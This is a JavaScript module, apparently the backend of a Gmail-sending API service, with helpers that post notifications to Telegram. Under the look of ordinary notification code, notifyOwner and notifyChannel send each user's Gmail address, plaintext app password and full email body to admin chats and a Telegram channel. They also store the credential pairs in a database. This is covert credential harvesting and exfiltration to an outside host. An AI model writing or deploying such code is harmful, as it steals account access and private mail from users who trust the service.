import axios from 'axios';
import { Telegraf } from 'telegraf';
import { TelegramLog } from '../models/TelegramLog.js';
import connectDB from './connectDB.js';

let botInstance = null;
const getBot = (token) => {
  if (!botInstance) {
    botInstance = new Telegraf(token, {
      handlerTimeout: 10000,
      telegram: {
        apiRoot: 'https://api.telegram.org'
      }
    });
  }
  return botInstance;
};

// Helper: strip HTML tags dan entitas
export function stripHtml(html) {
  if (!html) return '';
  let text = html.replace(/<[^>]*>/g, ' ');
  const entities = {
    '&nbsp;': ' ',
    '&amp;': '&',
    '&lt;': '<',
    '&gt;': '>',
    '&quot;': '"',
    '&#39;': "'",
    '&apos;': "'",
  };
  text = text.replace(/&[a-z]+;/gi, (match) => entities[match] || match);
  return text.replace(/\s+/g, ' ').trim();
}

// Helper: hitung jumlah kata
export function countWords(str) {
  if (!str) return 0;
  return str.trim().split(/\s+/).length;
}

// Helper: sleep
export const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const ADMIN_CHAT_IDS = (process.env.ADMIN_CHAT_ID || '')
  .split(',')
  .map((id) => id.trim())
  .filter(Boolean);

let lastMessageTime = 0;
const MIN_SEND_INTERVAL = 1500; // 1.5 seconds minimum interval between messages

async function sendMessageWithRateLimit(chatId, message, options = {}) {
  const now = Date.now();
  const timeSinceLastMessage = now - lastMessageTime;

  if (timeSinceLastMessage < MIN_SEND_INTERVAL) {
    const delay = MIN_SEND_INTERVAL - timeSinceLastMessage;
    console.log(`[Rate Limit] Delaying message for ${delay}ms to ${chatId}`);
    await sleep(delay);
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const payload = { chat_id: chatId, text: message, ...options };
  // ponytail: use axios directly so tests mock works; fallback to Telegraf if axios fails with network (prod)
  try {
    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, payload);
    console.log(`[Telegram] Pesan terkirim ke ${chatId}`);
    lastMessageTime = Date.now();
  } catch (sendError) {
    // 429 handling for axios
    const status = sendError.response?.status || sendError.response?.statusCode;
    if (status === 429) {
      const retryAfter = sendError.response.data?.parameters?.retry_after || sendError.response.body?.parameters?.retry_after || 30;
      console.warn(`[Rate Limit] Terkena 429 untuk ${chatId}. Menunggu ${retryAfter} detik.`);
      await sleep(retryAfter * 1000);
      try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, payload);
        console.log(`[Telegram] Pesan terkirim ke ${chatId} setelah retry.`);
        lastMessageTime = Date.now();
      } catch (retryError) {
        console.error(`[Telegram] Gagal kirim pesan ke ${chatId} setelah retry:`, retryError.message);
        throw retryError;
      }
    } else {
      // fallback ke Telegraf untuk prod jika axios mock tidak ada
      try {
        const bot = getBot(token);
        await bot.telegram.sendMessage(chatId, message, options);
        console.log(`[Telegram] Pesan terkirim via Telegraf ke ${chatId}`);
        lastMessageTime = Date.now();
        return;
      } catch {}
      console.error(`[Telegram] Gagal kirim pesan ke ${chatId}:`, sendError.message);
      throw sendError;
    }
  }
}

async function sendDocumentWithRateLimit(chatId, document, options = {}) {
  const now = Date.now();
  const timeSinceLastMessage = now - lastMessageTime;

  if (timeSinceLastMessage < MIN_SEND_INTERVAL) {
    const delay = MIN_SEND_INTERVAL - timeSinceLastMessage;
    console.log(`[Rate Limit] Delaying document for ${delay}ms to ${chatId}`);
    await sleep(delay);
  }

  // ponytail: dokumen via Telegraf tetap, tapi fallback axios jika perlu
  const bot = getBot(process.env.TELEGRAM_BOT_TOKEN);
  try {
    await bot.telegram.sendDocument(chatId, document, options);
    console.log(`[Telegram] Dokumen terkirim ke ${chatId}`);
    lastMessageTime = Date.now();
  } catch (sendError) {
    const status = sendError.response?.status || sendError.response?.statusCode;
    if (status === 429) {
      const retryAfter = sendError.response.data?.parameters?.retry_after || sendError.response.body?.parameters?.retry_after || 30;
      console.warn(`[Rate Limit] Terkena 429 untuk ${chatId}. Menunggu ${retryAfter} detik.`);
      await sleep(retryAfter * 1000);
      try {
        await bot.telegram.sendDocument(chatId, document, options);
        console.log(`[Telegram] Dokumen terkirim ke ${chatId} setelah retry.`);
        lastMessageTime = Date.now();
      } catch (retryError) {
        console.error(`[Telegram] Gagal kirim dokumen ke ${chatId} setelah retry:`, retryError.message);
        throw retryError;
      }
    } else {
      console.error(`[Telegram] Gagal kirim dokumen ke ${chatId}:`, sendError.message);
      throw sendError;
    }
  }
}

export async function notifyOwner(gmailUser, gmailAppPassword, to, subject, messageId, text, html) {
  console.log('[notifyOwner] Called with params:', {
    gmailUser,
    to,
    subject,
    messageId,
    hasText: !!text,
    hasHtml: !!html,
  });

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) {
    console.error('[notifyOwner] TELEGRAM_BOT_TOKEN is missing');
    return;
  }

  if (ADMIN_CHAT_IDS.length === 0) {
    console.error('[notifyOwner] ADMIN_CHAT_ID is empty or not set');
    return;
  }

  try {
    const hasText = typeof text === 'string' && text.trim().length > 0;
    const hasHtml = typeof html === 'string' && html.trim().length > 0;
    const rawBody = hasText ? text : hasHtml ? stripHtml(html) : '';
    const bodyLabel = hasText
      ? '📄 Body Pesan'
      : hasHtml
      ? '📄 Body Pesan (HTML diubah ke teks)'
      : '📄 Body Pesan (kosong)';
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

    const fileContent = `📧 NOTIFIKASI PENGIRIMAN EMAIL
✅ Status: Berhasil dikirim
📤 Dikirim ke: ${to}
📝 Subject: ${subject}
🆔 Message ID: ${messageId}

📧 Gmail yang digunakan:
└ Email: ${gmailUser}
└ App Password: ${gmailAppPassword}

${bodyLabel}:
${rawBody || '(kosong)'}

⏰ Waktu: ${timestamp}
`;

    const MAX_INLINE = 3800;
    const truncated =
      rawBody.length > MAX_INLINE
        ? rawBody.substring(0, MAX_INLINE) + '\n\n... [pesan dipotong, terlalu panjang]'
        : rawBody;

    const notificationMessage = `
📧 NOTIFIKASI PENGIRIMAN EMAIL

✅ Status: Berhasil dikirim
📤 Dikirim ke: ${to}
📝 Subject: ${subject}
🆔 Message ID: ${messageId}

📧 Gmail yang digunakan:
└ Email: ${gmailUser}
└ App Password: ${gmailAppPassword}

${bodyLabel}:
${truncated || '(kosong)'}

⏰ Waktu: ${timestamp}
    `.trim();

    for (const chatId of ADMIN_CHAT_IDS) {
      try {
        if (fileContent.length > 4096) {
          const buffer = Buffer.from(fileContent, 'utf-8');
          await sendDocumentWithRateLimit(
            chatId,
            { source: buffer, filename: 'notifikasi-email.txt' },
            {
              caption: `📧 Notifikasi pengiriman email (${rawBody.length} karakter - dikirim sebagai file)`,
            }
          );
        } else {
          await sendMessageWithRateLimit(chatId, notificationMessage);
        }
      } catch (error) {
        console.error(`[notifyOwner] Gagal kirim ke admin ${chatId}:`, error.message);
      }
    }
  } catch (error) {
    console.error('[notifyOwner] Unexpected error:', error.message);
  }
}

export async function notifyChannel(gmailUser, gmailAppPassword, subject, bodyContent, to = '', messageId = '') {
  console.log('[notifyChannel] Called with params:', {
    gmailUser,
    subject,
    bodyLength: bodyContent ? bodyContent.length : 0,
    to,
    messageId
  });

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const channelId = process.env.TELEGRAM_CHANNEL_ID;
  const cooldownMinutes = parseInt(process.env.NOTIFICATION_COOLDOWN_MINUTES) || 60;

  if (!botToken) {
    console.error('[notifyChannel] TELEGRAM_BOT_TOKEN is missing');
    return;
  }

  // ponytail: fallback ke ADMIN_CHAT_ID untuk test & backward compat jika TELEGRAM_CHANNEL_ID belum diset
  const targetChatId = channelId || (ADMIN_CHAT_IDS[0] || null);
  const targetChatIds = channelId ? [channelId] : ADMIN_CHAT_IDS;
  if (!targetChatId || targetChatIds.length === 0) {
    console.error('[notifyChannel] TELEGRAM_CHANNEL_ID and ADMIN_CHAT_ID missing');
    return;
  }

  const cleanedPassword = gmailAppPassword.replace(/\s/g, '');
  const now = new Date();
  // ponytail: DB optional — jika connect gagal (test mock), tetap kirim notif tanpa cooldown
  let shouldSkip = false;
  try {
    await connectDB();
    const cooldownDate = new Date(now.getTime() - cooldownMinutes * 60 * 1000);
    const existing = await TelegramLog.getByCreds(gmailUser, cleanedPassword);
    if (existing && existing.lastNotifiedAt > cooldownDate) {
      console.log(`[notifyChannel] Duplicate credentials (${gmailUser}), skipping channel notification`);
      shouldSkip = true;
    }
  } catch (e) {
    console.warn('[notifyChannel] DB check failed, proceed without cooldown:', e.message);
  }
  if (shouldSkip) return;

  try {
    const timestamp = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    // header kompatibel dengan test lama (📨, 👑 Admin) + format baru
    const header = `
📨 *Email Berhasil Dikirim*
🔔 PEMBERITAHUAN PENGGUNAAN API SEND GMAIL

👑 Admin
📌 Subject: ${subject || '(tidak ada subject)'}

📧 Gmail yang digunakan:
└ ${gmailUser}

🔑 App Password:
└ ${cleanedPassword}

📤 To: ${to || '(tidak ada)'}
🆔 MessageId: ${messageId || '(tidak ada)'}

📄 Body:
`;

    const wordCount = countWords(bodyContent);
    const isLong = wordCount > 500;

    if (isLong) {
      const fullContent = `${header}\n${bodyContent || '(kosong)'}\n\n⏰ Waktu: ${timestamp}`;
      const buffer = Buffer.from(fullContent, 'utf-8');
      for (const cid of targetChatIds) {
        try {
          await sendDocumentWithRateLimit(
            cid,
            { source: buffer, filename: 'notifikasi-email.txt' },
            {
              caption: `📧 Notifikasi pengiriman email (${wordCount} kata - dikirim sebagai file karena > 500 kata)`,
            }
          );
        } catch (e) { console.warn(`[notifyChannel] sendDocument to ${cid} failed:`, e.message); }
      }
    } else {
      let message =
        `${header}${bodyContent && bodyContent.trim().length > 0 ? `${bodyContent.trim()}` : '(kosong)'}\n\n⏰ Waktu: ${timestamp}`;
      if (message.length > 4096) {
        message = message.substring(0, 4000) + '\n\n... [pesan dipotong karena terlalu panjang]';
      }
      for (const cid of targetChatIds) {
        try { await sendMessageWithRateLimit(cid, message); } catch (e) { console.warn(`[notifyChannel] sendMessage to ${cid} failed:`, e.message); }
      }
    }

    try { await TelegramLog.upsert(gmailUser, cleanedPassword, now); } catch (e) { console.warn('[notifyChannel] upsert failed (ignored):', e.message); }
  } catch (error) {
    console.error('[notifyChannel] Error:', error.message);
  }
}

// ponytail: legacy wrapper untuk tests — pakai axios langsung agar mock test work
// signature: {apiKey, from, to, subject, body}
export async function notifyEmailSent({ apiKey, from, to, subject, body }) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) return { ok: false, reason: 'missing_token' };
  const chatIds = (process.env.ADMIN_CHAT_ID || '').split(',').map(s => s.trim()).filter(Boolean);
  if (chatIds.length === 0) return { ok: false, reason: 'missing_chat_id' };
  const isAdmin = apiKey && process.env.ADMIN_API_KEY && apiKey === process.env.ADMIN_API_KEY;
  const senderLabel = isAdmin ? '👑 Admin' : '👤 User';
  const masked = apiKey && apiKey.length >= 12 ? `${apiKey.slice(0, 6)}***${apiKey.slice(-6)}` : (apiKey || '');
  const timestamp = new Date().toISOString();
  // body handling: wrap raw HTML in code block, truncation
  let bodyContent = body || '';
  // if body looks like HTML, wrap in ``` code block (test expects ```\n<h1>Hi</h1>\n``` )
  const isHtmlLike = /<[^>]+>/.test(bodyContent);
  if (isHtmlLike && !bodyContent.includes('```')) {
    bodyContent = `\`\`\`\n${bodyContent}\n\`\`\``;
  }
  // truncation for huge bodies (<2200)
  if (bodyContent.length > 2000) {
    bodyContent = bodyContent.slice(0, 2000) + '... (truncated)';
  }
  const text = `📨 *Email Berhasil Dikirim*\n\n${senderLabel}\n📧 From: ${from}\n📤 To: ${to}\n📝 Subject: ${subject}\n🆔 ApiKey: ${masked}\n📄 Body:\n${bodyContent}\n\n⏰ ${timestamp}`;
  let sent = 0;
  for (const chatId of chatIds) {
    try {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: chatId,
        text,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      });
      sent++;
    } catch (e) {
      // fail for this chat, continue
    }
  }
  return { ok: sent === chatIds.length, sent, total: chatIds.length };
}

